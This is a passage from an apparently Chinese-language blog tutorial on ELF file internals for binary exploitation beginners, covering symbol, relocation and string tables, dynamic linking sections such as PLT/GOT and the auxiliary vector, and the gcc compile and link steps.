<h2 id="静态链接相关"><a href="#静态链接相关" class="headerlink" title="静态链接相关"></a>静态链接相关</h2><p><strong>注意：静态链接相关只在可重定位文件中存在。比如可执行文件，如果不开启 PIE 加载地址固定，不需要对自身进行重定位，而开启 PIE 后为地址无关代码，也不需要对自身进行重定位。因此不需要静态链接也就丢弃了静态链接相关的节。</strong></p>
<h3 id="符号表（-symtab）"><a href="#符号表（-symtab）" class="headerlink" title="符号表（.symtab）"></a>符号表（.symtab）</h3><p><strong>注意：符号表除了静态链接外没有用，但是程序为了方便调试会保留符号表，我们可以通过 <code>strip + 程序名</code> 的方式将符号表去除，这就是为什么有的 pwn 题的附件没有函数和变量名而有的却有。</strong></p>
<p>ELF 文件中的符号表往往是文件中的一个段，段名一般叫 <code>.symtab</code> 。符号表是一个 <code>Elf*_Sym</code> 结构（32 位 ELF 文件）的数组，每个 <code>Elf*_Sym</code> 结构对应一个符号。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Symbol table entry.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word	st_name;		<span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">  Elf32_Addr	st_value;		<span class="comment">/* Symbol value */</span></span><br><span class="line">  Elf32_Word	st_size;		<span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	st_info;		<span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	st_other;		<span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf32_Section	st_shndx;		<span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>st_name</code>：符号名称在<strong>字符串</strong>表中的偏移量。</li>
<li><code>st_value</code>：符号的值，即符号的地址或偏移量。<ul>
<li>如果该符号在<strong>目标文件</strong>中，如果是符号的定义并且该符号不是 <code>COMMON</code> 块类型的则 <code>st_value</code> 表示该符号在段中的<strong>偏移</strong>。</li>
<li>在<strong>目标文件</strong>中，如果符号是 <code>COMMON</code> 块类型的则 <code>st_value</code> 表示该符号的<strong>对齐属性</strong>。</li>
<li>在<strong>可执行文件</strong>中，<code>st_value</code> 表示符号的<strong>虚拟地址</strong>。</li>
</ul>
</li>
<li><code>st_size</code>：符号的大小，如果符号是一个函数，则表示函数的大小。如果该值为 0 表示符号的大小为 0 或未知。</li>
<li><code>st_info</code>：该字段是一个字节，包含符号的类型和绑定信息。符号类型包括函数、数据、对象等，符号绑定包括局部符号、全局符号、弱符号等。该字段的高 4 位表示符号的类型，低 4 位表示符号的绑定信息。</li>
<li><code>st_other</code>：保留字段，通常为 0 。</li>
<li><code>st_shndx</code>：通常为符号所在<strong>节</strong>的索引。<ul>
<li>如果符号是一个常量，该字段为 <code>SHN_ABS</code>（初始值不为 0 的全局变量） 或 <code>SHN_COMMON</code>（初始值为 0 的全局变量）。</li>
<li>如果该符号未定义但是在该文件中被引用到，说明该符号可能定义在其他目标文件中，则该字段为 <code>SHN_UNDEF</code> 。</li>
</ul>
</li>
</ul>
<h3 id="重定位表（-rel-text-rel-data）"><a href="#重定位表（-rel-text-rel-data）" class="headerlink" title="重定位表（.rel.text&#x2F;.rel.data）"></a>重定位表（.rel.text&#x2F;.rel.data）</h3><p>重定位表是一个 <code>Elf*_Rel</code> 结构的数组，每个数组元素对应一个重定位入口。重定位表主要有<code>.rel.text</code> 或 <code>.rela.text</code>，即代码重定位节（Relocation Section）和 <code>.rel.data</code> 或 <code>.rela.data</code>：数据重定位节（Relocation Section）。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Relocation table entry without addend (in section of type SHT_REL).  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr	r_offset;		<span class="comment">/* Address */</span></span><br><span class="line">  Elf32_Word	r_info;			<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>r_offset</code>：需要进行重定位的位置的偏移量或地址。这个位置通常是指令中的某个操作数或数据的地址，需要在链接时进行修正，以便正确地引用目标符号。<ul>
<li>对于可执行文件或共享库，<code>r_offset</code> 表示需要修改的位置在内存中的位置（用于动态链接）。</li>
<li>对于<strong>可重定位文件</strong>，<code>r_offset</code> 表示需要修改的位置相对于段起始位置的偏移（用于静态链接）。</li>
</ul>
</li>
<li><code>r_info</code>：低 8 位表示符号的重定位类型，重定位类型指定了进行何种类型的修正，例如绝对重定位、PC 相对重定位等。高 24 位表示该符号在<strong>符号表</strong>中的索引，用于解析重定位所引用的符号。</li>
</ul>
<h3 id="字符串表（-strtab）"><a href="#字符串表（-strtab）" class="headerlink" title="字符串表（.strtab）"></a>字符串表（.strtab）</h3><p>ELF 文件中用到了很多字符串，比如段名、变量名等。因为字符串的长度往往是不定的，所以用固定的结构来表示它比较困难。一种很常见的做法是把字符串集中起来存放到一个表，然后使用字符串在表中的偏移来引用字符串。</p>
<p>通过这种方法，在ELF文件中引用字符串只须给出一个数字下标即可，不用考虑字符串长度的问题。一般字符串表在ELF文件中也以段的形式保存，常见的段名为“<code>.strtab</code>”或“<code>.shstrtab</code>”。这两个字符串表分别为字符串表（String Table）和段表字符串表（Section Header String Table）。顾名思义，字符串表用来保存普通的字符串，比如符号的名字；段表字符串表用来保存段表中用到的字符串，最常见的就是段名（<code>sh_name</code> ）。</p>
<p>注意，在字符串表中的每个字符串的<strong>开头</strong>和<strong>结尾</strong>都有一个 <code>\x00</code> 填充。</p>
<h2 id="动态链接相关"><a href="#动态链接相关" class="headerlink" title="动态链接相关"></a>动态链接相关</h2><h3 id="interp-段"><a href="#interp-段" class="headerlink" title=".interp 段"></a>.interp 段</h3><p>在动态链接的 ELF 可执行文件中，有一个专门的段叫做 <code>.interp</code> 段（“interp”是“interpreter”（解释器）的缩写）。</p>
<p><code>.interp</code> 的内容很简单，里面保存的就是一个字符串 <code>/lib64/ld-linux-x86-64.so.2</code> ，这个字符串就是可执行文件所需要的动态链接器的路径。</p>
<p>通常系统通过判断一个 ELF 程序是否有 <code>.interp</code> 来判断该 ELF 文件是否为动态链接程序。</p>
<h3 id="dynamic-段"><a href="#dynamic-段" class="headerlink" title=".dynamic 段"></a>.dynamic 段</h3><p>动态链接 ELF 中最重要的结构是 <code>.dynamic</code> 段，这个段里面保存了动态链接器所需要的基本信息，比如依赖于哪些共享对象、动态链接符号表的位置、动态链接重定位表的位置、共享对象初始化代码的地址等。<code>.dynamic</code> 段是由<code>Elf*_Dyn</code> 构成的结构体数组。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Dynamic section entry.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Sword	d_tag;			<span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      Elf32_Word d_val;			<span class="comment">/* Integer value */</span></span><br><span class="line">      Elf32_Addr d_ptr;			<span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br></pre></td></tr></table></figure></div>
<p><code>Elf32_Dyn</code> 结构由一个类型值加上一个附加的数值或指针，对于不同的类型，后面附加的数值或者指针有着不同的含义。我们这里列举几个比较常见的类型值（这些值都是定义在 <code>elf.h</code> 里面的宏），</p>
<ul>
<li><code>DT_SYMTAB</code>：指定了符号表的地址，<code>d_ptr</code> 表示 <code>.dynsym</code> 的地址。</li>
<li><code>DT_STRTAB</code>：指定了字符串表的地址，<code>d_ptr</code> 表示 <code>.synstr</code> 的地址。</li>
<li><code>DT_STRSZ</code>：指定了字符串表的大小，<code>d_val</code> 表示大小。</li>
<li><code>DT_HASH</code>：指定了符号哈希表的地址，用于加快符号查找的速度，<code>d_ptr</code> 表示 <code>.hash</code> 的地址。</li>
<li><code>DT_SONAME</code>：指定了共享库的名称。</li>
<li><code>DT_RPATH</code>：指定了库搜索路径（已废弃，不推荐使用）。</li>
<li><code>DT_INIT</code>：指定了初始化函数的地址，动态链接器在加载可执行文件或共享库时会调用该函数。</li>
<li><code>DT_FINI</code>：指定了终止函数的地址，动态链接器在程序结束时会调用该函数。</li>
<li><code>DT_NEEDED</code>：指定了需要的共享库的名称。</li>
<li><code>DT_REL/DT_RELA</code>：指定了重定位表的地址。</li>
</ul>
<h3 id="动态符号表（-dynsym）"><a href="#动态符号表（-dynsym）" class="headerlink" title="动态符号表（.dynsym）"></a>动态符号表（.dynsym）</h3><p>为了完成动态链接，最关键的还是所依赖的符号和相关文件的信息。我们知道在静态链接中，有一个专门的段叫做符号表 <code>.symtab</code>（Symbol Table），里面保存了所有关于该目标文件的符号的定义和引用。为了表示动态链接这些模块之间的符号导入导出关系，ELF 专门有一个叫做动态符号表（Dynamic Symbol Table）的段用来保存这些信息，这个段的段名通常叫做 <code>.dynsym</code>（Dynamic Symbol），同样也是由 <code>Elf*_Sym</code> 构成的结构体数组。</p>
<p>与 <code>.symtab</code> 不同的是，<code>.dynsym</code> 只保存了与动态链接相关的符号，对于那些模块内部的符号，比如模块私有变量则不保存。很多时候动态链接的模块同时拥有 <code>.dynsym</code> 和 <code>.symtab</code> 两个表，<code>.symtab</code> 中往往保存了所有符号，包括 <code>.dynsym</code> 中的符号。</p>
<p>与 <code>.symtab</code> 类似，动态符号表也需要一些辅助的表，比如用于保存符号名的字符串表。静态链接时叫做符号字符串表 <code>.strtab</code>（String Table），在这里就是动态符号字符串表 <code>.dynstr</code>（Dynamic String Table）；由于动态链接下，我们需要在程序运行时查找符号，为了加快符号的查找过程，往往还有辅助的符号哈希表（<code>.hash</code>）。</p>
<h3 id="动态链接重定位表（-rel-dyn-rel-data）"><a href="#动态链接重定位表（-rel-dyn-rel-data）" class="headerlink" title="动态链接重定位表（.rel.dyn&#x2F;.rel.data）"></a>动态链接重定位表（.rel.dyn&#x2F;.rel.data）</h3><p>共享对象需要重定位的主要原因是导入符号的存在。动态链接下，无论是可执行文件或共享对象，一旦它依赖于其他共享对象，也就是说有导入的符号时，那么它的代码或数据中就会有对于导入符号的引用。在编译时这些导入符号的地址未知，在静态链接中，这些未知的地址引用在最终链接时被修正。但是在动态链接中，导入符号的地址在运行时才确定，所以需要在运行时将这些导入符号的引用修正，即需要重定位。</p>
<p>共享对象的重定位与我们在前面“静态链接”中分析过的目标文件的重定位十分类似，唯一有区别的是目标文件的重定位是在静态链接时完成的，而共享对象的重定位是在装载时完成的。在静态链接中，目标文件里面包含有专门用于表示重定位信息的重定位表，比如 <code>.rel.text</code> 表示是代码段的重定位表，<code>.rel.data</code> 是数据段的重定位表。</p>
<p>动态链接的文件中，也有类似的重定位表分别叫做 <code>.rel.dyn</code> 和 <code>.rel.plt</code> ，它们分别相当于 <code>.rel.data</code> 和 <code>.rel.text</code> 。<code>.rel.dyn</code> 实际上是对数据引用的修正，它所修正的位置位于 <code>.got</code> 以及数据段；而 <code>.rel.plt</code> 是对函数引用的修正，它所修正的位置位于 <code>.got.plt</code> 。</p>
<h3 id="PLT-表（-plt）"><a href="#PLT-表（-plt）" class="headerlink" title="PLT 表（.plt）"></a>PLT 表（.plt）</h3><p>在未开启 FULL RELRO 的情况下 PLT 表的结构如下图所示， PLT 表在 <code>.plt</code>（有的还包括 <code>.plt.got</code>） 中。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108002353202.png"
                      alt="image-20241108002353202"
                ><br>PLT 表的形式如下所示：</p>
<span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="right left" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mtext>PLT0:</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mspace width="2em"/><mtext>push *(GOT+8)</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mspace width="2em"/><mtext>jmp *(GOT+16)</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mspace width="2em"/><mi><mi mathvariant="normal">⋮</mi><mpadded height="0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mtext>bar@PLT:</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mspace width="2em"/><mtext>jmp *(bar@GOT)</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mspace width="2em"/><mtext>push n</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow></mrow><mspace width="2em"/><mtext>jmp PLT0</mtext></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">
\begin{align*}
&amp;  \text{PLT0:} \\
&amp;  \qquad  \text{push *(GOT+8)} \\
&amp;  \qquad \text{jmp *(GOT+16)} \\
&amp; \qquad  \vdots \\
&amp; \text{bar@PLT:} \\
&amp;  \qquad \text{jmp *(bar@GOT)} \\
&amp; \qquad \text{push n} \\
&amp; \qquad \text{jmp PLT0} \\
\end{align*}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:12.66em;vertical-align:-6.08em;"></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:6.58em;"><span style="top:-9.24em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:-7.74em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:-6.24em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:-4.08em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:-2.58em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:-1.08em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:0.42em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span><span style="top:1.92em;"><span class="pstrut" style="height:3.5em;"></span><span class="mord"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:6.08em;"><span></span></span></span></span></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:6.58em;"><span style="top:-9.4275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mord text"><span class="mord">PLT0:</span></span></span></span><span style="top:-7.9275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:2em;"></span><span class="mord text"><span class="mord">push *(GOT+8)</span></span></span></span><span style="top:-6.4275em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:2em;"></span><span class="mord text"><span class="mord">jmp *(GOT+16)</span></span></span></span><span style="top:-4.2675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:2em;"></span><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span><span style="top:-2.7675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mord text"><span class="mord">bar@PLT:</span></span></span></span><span style="top:-1.2675em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:2em;"></span><span class="mord text"><span class="mord">jmp *(bar@GOT)</span></span></span></span><span style="top:0.2325em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:2em;"></span><span class="mord text"><span class="mord">push n</span></span></span></span><span style="top:1.7325em;"><span class="pstrut" style="height:3.6875em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:2em;"></span><span class="mord text"><span class="mord">jmp PLT0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:6.08em;"><span></span></span></span></span></span></span></span></span></span></span></span>
<p>其中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 为函数 <code>bar</code> 在 GOT 表中的值的索引，<code>bar@GOT</code> 中初始值为 <code>jmp *(bar@GOT)</code> 指令的下一条指令，也就是说第一次调用 <code>bar</code> 函数的时候会继续执行跳转至 <code>PLT0</code> 进行 <code>bar@GOT</code> 的重定位并调用 <code>bar</code> 函数；第二次调用 <code>bar</code> 函数的时候由于 <code>bar@GOT</code> 已完成重定位因此会直接跳转至 <code>bar</code> 函数。</p>
<p>在开启 FULL RELRO 的情况下 PLT 表的结构如下图所示，此时的 PLT 表在 <code>.plt.sec</code> 而不是 <code>.plt</code> 中。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108002437068.png"
                      alt="image-20241108002437068"
                ><br>由于 GOT 表在装载时已经完成重定位且不可写，因此不存在延迟绑定，PLT 直接根据 GOT 表存储的函数地址进行跳转。</p>
<h3 id="GOT-表（-got-got-plt）"><a href="#GOT-表（-got-got-plt）" class="headerlink" title="GOT 表（.got&#x2F;.got.plt）"></a>GOT 表（.got&#x2F;.got.plt）</h3><p>ELF 将 GOT 拆分成了两个表叫做 <code>.got</code> 和 <code>.got.plt</code> 。其中 <code>.got</code> 用来保存全局变量引用的地址，<code>.got.plt</code> 用来保存函数引用的地址，也就是说，所有对于外部函数的引用全部被分离出来放到了 <code>.got.plt</code> 中（当然有的 ELF 文件可能吧这两个表合并为一个 <code>.got</code> 表，结构等同于后面提到的 <code>.got.plt</code>）。另外 <code>.got.plt</code> 还有一个特殊的地方是它的前三项是有特殊意义的，分别含义如下：</p>
<ul>
<li>第一项保存的是 <code>.dynamic</code> 段的偏移（也有可能是 <code>.dynamic</code> 段的地址）。</li>
<li>第二项是一个 <code>link_map</code> 的结构体指针，里面保存着动态链接的一些相关信息，是重定位函数 <code>_dl_runtime_resolve</code> 的第一个参数。</li>
<li>第三项保存的是 <code>_dl_runtime_resolve</code> 的地址。</li>
</ul>
<p><code>.got.plt</code> 在内存中的状态如下图所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108003009195.png"
                     
                ></p>

  <div class="note p-4 mb-4 rounded-small red info">
    <p>注意：静态链接程序也是有 plt 表和 got 表的，并且 plt 表也会被调用。</p>

  </div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108003049464.png"
                     
                ></p>
<h3 id="辅助信息数组"><a href="#辅助信息数组" class="headerlink" title="辅助信息数组"></a>辅助信息数组</h3><p><strong>无论静态还是动态链接程序都有辅助信息数组，只是动态链接程序是动态链接器使用辅助信息数组。</strong></p>
<p>站在动态链接器的角度看，当操作系统把控制权交给它的时候，它将开始做链接工作，那么至少它需要知道关于可执行文件和本进程的一些信息，比如可执行文件有几个段（“Segment”）、每个段的属性、程序的入口地址（因为动态链接器到时候需要把控制权交给可执行文件）等。</p>
<p>这些信息往往由操作系统传递给动态链接器，保存在进程的堆栈里面。我们在前面提到过，进程初始化的时候，事实上，堆栈里面还保存了动态链接器所需要的一些辅助信息数组（Auxiliary Vector）。辅助信息的格式也是一个结构数组，它的结构被定义在 <code>elf.h</code> ：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">uint32_t</span> a_type;		<span class="comment">/* Entry type */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="type">uint32_t</span> a_val;		<span class="comment">/* Integer value */</span></span><br><span class="line">      <span class="comment">/* We use to have pointer elements added here.  We cannot do that,</span></span><br><span class="line"><span class="comment">	 though, since it does not work when using 32-bit definitions</span></span><br><span class="line"><span class="comment">	 on 64-bit platforms and vice versa.  */</span></span><br><span class="line">    &#125; a_un;</span><br><span class="line">&#125; Elf32_auxv_t;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>a_type</code> 字段表示辅助信息数组的类型。下面是一些常见的 <code>a_type</code> 值及其对应的含义：<ul>
<li><code>AT_NULL (0)</code>：辅助向量列表的结束标志。在列表的最后一个条目中使用。</li>
<li><code>AT_IGNORE (1)</code>：忽略的辅助向量类型。在某些情况下，可以将该类型的辅助向量忽略。</li>
<li><code>AT_EXECFD (2)</code>：可执行文件的文件描述符。表示打开可执行文件的文件描述符。</li>
<li><code>AT_PHDR (3)</code>：程序头表的地址。指向程序头表在内存中的起始地址。</li>
<li><code>AT_PHENT (4)</code>：程序头表中每个条目的大小（字节）。指示每个程序头表条目的字节数。</li>
<li><code>AT_PHNUM (5)</code>：程序头表的条目数量。指示程序头表中的条目数量。</li>
<li><code>AT_PAGESZ (6)</code>：页面大小。表示操作系统使用的页面大小。</li>
<li><code>AT_BASE (7)</code>：共享对象的基地址。指向主共享对象的基地址。</li>
<li><code>AT_FLAGS (8)</code>：标志位。包含一些特定于操作系统的标志。</li>
<li><code>AT_ENTRY (9)</code>：程序入口点的地址。指向程序的入口点地址。</li>
<li><code>AT_NOTELF (10)</code>：不是ELF文件。指示加载程序的文件不是有效的ELF文件。</li>
</ul>
</li>
<li><code>a_un</code>：该成员是一个联合体（union），用于存储辅助向量条目的值。在这段代码中，由于指针类型的元素会在 32 位和 64 位平台上产生兼容性问题，所以注释中提到不再添加指针元素。<ul>
<li><code>a_val</code>：如果辅助向量条目的类型是一个整数值，那么该成员将存储该整数值。它也是一个 32 位的无符号整数。</li>
</ul>
</li>
</ul>
<h1 id="程序编译过程"><a href="#程序编译过程" class="headerlink" title="程序编译过程"></a>程序编译过程</h1><p>从源文件编译链接形成 ELF 文件的过程如下图所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108004250085.png"
                      alt="image-20241108004250085"
                ></p>
<h2 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h2><p>首先是源代码文件和相关的头文件，如 <code>stdio.h</code> 等被预编译器 cpp 预编译成一个 <code>.i</code> 文件。对于 C++ 程序来说，它的源代码文件的扩展名可能是 <code>.cpp</code> 或 <code>.cxx</code> ，头文件的扩展名可能是 <code>.hpp</code> ，而预编译后的文件扩展名是 <code>.ii</code> 。</p>
<p>第一步预编译的过程相当于如下命令（<code>-E</code> 表示只进行预编译）：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">gcc –E hello.c –o hello.i</span><br></pre></td></tr></table></figure></div>
<p>或者：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">cpp hello.c &gt; hello.i</span><br></pre></td></tr></table></figure></div>
<p>预编译过程主要处理那些源代码文件中的以 <code>#</code> 开始的预编译指令。比如 <code>#include</code> 、<code>#define</code> 等，主要处理规则如下：</p>
<ul>
<li>将所有的 <code>#define</code> 删除，并且展开所有的宏定义。</li>
<li>处理所有条件预编译指令，比如 <code>#if</code> 、<code>#ifdef</code> 、<code>#elif</code> 、<code>#else</code> 、<code>#endif</code> 。</li>
<li>处理 <code>#include</code> 预编译指令，将被包含的文件插入到该预编译指令的位置。注意，这个过程是递归进行的，也就是说被包含的文件可能还包含其他文件。</li>
<li>删除所有的注释 <code>//</code> 和 <code>/* */</code> 。</li>
<li>添加行号和文件名标识，比如 <code>#2&quot;hello.c&quot;2</code> ，以便于编译时编译器产生调试用的行号信息及用于编译时产生编译错误或警告时能够显示行号。</li>
<li>保留所有的 <code>#pragma</code> 编译器指令，因为编译器须要使用它们。</li>
</ul>
<p>经过预编译后的 <code>.i</code> 文件不包含任何宏定义，因为所有的宏已经被展开，并且包含的文件也已经被插入到 <code>.i</code> 文件中。所以当我们无法判断宏定义是否正确或头文件包含是否正确时，可以查看预编译后的文件来确定问题。</p>
<h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>编译过程就是把预处理完的文件进行一系列词法分析、语法分析、语义分析及优化后生产相应的汇编代码文件，这个过程往往是我们所说的整个程序构建的核心部分，也是最复杂的部分之一。</p>
<p>上面的编译过程相当于如下命令：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">gcc –S hello.i –o hello.s</span><br></pre></td></tr></table></figure></div>
<h2 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h2><p>汇编器是将汇编代码转变成机器可以执行的指令，每一个汇编语句几乎都对应一条机器指令。所以汇编器的汇编过程相对于编译器来讲比较简单，它没有复杂的语法，也没有语义，也不需要做指令优化，只是根据汇编指令和机器指令的对照表一一翻译就可以了，“汇编”这个名字也来源于此。</p>
<p>上面的汇编过程我们可以调用汇编器 as 来完成：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">as hello.s –o hello.o</span><br></pre></td></tr></table></figure></div>
<p>或者使用 gcc 命令从 C 源代码文件开始，经过预编译、编译和汇编直接输出目标文件（Object File）：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">gcc –c hello.c –o hello.o</span><br></pre></td></tr></table></figure></div>
<h1 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h1><h2 id="静态链接"><a href="#静态链接" class="headerlink" title="静态链接"></a>静态链接</h2><p>静态链接是在编译过程的最后阶段将多个目标文件（如 <code>.o</code> 文件）以及所需的库文件合并在一起，生成最终的可执行文件或共享库的过程。</p>
<p>可以使用如下命令将 <code>a.o</code> 和 <code>b.o</code> 链接为目标文件 ab 。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">ld a.o b.o -o ab</span><br></pre></td></tr></table></figure></div>
<h3 id="合并代码和数据段（Code-and-Data-Segment-Merging）"><a href="#合并代码和数据段（Code-and-Data-Segment-Merging）" class="headerlink" title="合并代码和数据段（Code and Data Segment Merging）"></a>合并代码和数据段（Code and Data Segment Merging）</h3><p>链接器将多个目标文件中的代码段和数据段合并成一个更大的代码段和数据段。这样，所有的目标文件中的代码和数据都会被整合到最终的可执行文件或静态库中。</p>
<h3 id="符号解析（Symbol-Resolution）"><a href="#符号解析（Symbol-Resolution）" class="headerlink" title="符号解析（Symbol Resolution）"></a>符号解析（Symbol Resolution）</h3><p>链接器负通过<strong>重定位表</strong>解析目标文件中的符号引用。每个目标文件都包含对其他目标文件或库中定义的符号的引用，例如函数、变量等。链接器会检查这些引用并确定对应的定义位置。</p>
<p>对于可重定位的 ELF 文件来说，它必须包含有重定位表，用来描述如何修改相应的段里的内容。对于每个要被重定位的 ELF 段都有一个对应的重定位表，而一个重定位表往往就是 ELF 文件中的一个段，所以其实重定位表也可以叫重定位段。</p>
<p>比如代码段 <code>.text</code> 如有要被重定位的地方，那么会有一个相对应叫 <code>.rel.text</code> 的段保存了代码段的重定位表；如果代码段 <code>.data</code> 有要被重定位的地方，就会有一个相对应叫 <code>.rel.data</code> 的段保存了数据段的重定位表。</p>
<p>链接器通过 <code> Elf32_Rel</code> 的 <code> r_offset</code> 加上所在段的起始位置得到<strong>重定位入口的位置</strong>；通过 <code>r_info</code> 的低 8 为得知<strong>重定位类型</strong>；通过 <code>r_info</code> 的高 24 位得到重定位符号在符号表（<code>.symtab</code>）中的下标。</p>
